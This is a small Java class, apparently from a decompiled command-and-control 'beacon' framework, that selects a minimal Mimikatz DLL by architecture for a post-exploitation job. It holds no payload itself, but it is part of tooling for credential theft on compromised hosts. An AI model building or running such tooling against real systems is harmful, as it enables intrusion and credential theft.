package beacon.jobs;

import beacon.TaskBeacon;

public class MimikatzJobSmall extends MimikatzJob {
    public MimikatzJobSmall(TaskBeacon taskBeacon, String string) {
        super(taskBeacon, string);
    }

    public String getDLLName() {
        return this.arch.equals("x64") ? "resources/mimikatz-min.x64.dll" : "resources/mimikatz-min.x86.dll";
    }
}
